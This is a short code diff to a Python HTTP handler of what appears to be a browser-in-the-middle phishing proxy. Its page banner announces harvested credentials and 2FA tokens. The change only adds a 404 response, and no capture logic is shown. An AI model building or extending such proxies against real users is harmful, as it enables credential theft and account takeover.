@@ -42,6 +42,9 @@ class BitMProxyHandler(BaseHTTPRequestHandler):
             self.send_header("Content-Type", "text/html; charset=utf-8")
             self.end_headers()
             self.wfile.write(b"<h1 style='color:red;'>[BITM HARVEST] Credenziali e Token 2FA Rubati dal Proxy Reverse!</h1>")
+        else:
+            self.send_response(404)
+            self.end_headers()
 
     def log_message(self, format, *args):
         print(f"[BitM Proxy 5001] {args[0]}")
